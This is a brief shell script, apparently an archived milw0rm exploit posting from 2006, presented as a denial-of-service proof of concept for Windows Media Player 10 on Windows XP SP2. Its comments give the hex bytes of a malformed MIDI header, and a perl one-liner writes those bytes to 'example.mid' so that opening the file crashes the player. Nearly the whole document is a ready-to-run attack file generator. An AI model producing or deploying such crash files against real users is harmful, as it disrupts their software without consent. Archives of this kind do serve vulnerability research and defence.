#!/bin/sh
# Windows Media MID File Denial Of Service Vulnerability
# Tested:
# Windows Media 10.00.00.4036
# Windows XP SP2
# file "example.mid" (Hex-Code):
# 4D 54 68 64 00 00 00 06 00 00 00 00 00 00
# File size = 14 byte

perl -e 'print "\x4D\x54\x68\x64\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00"' > example.mid

# milw0rm.com [2006-12-15]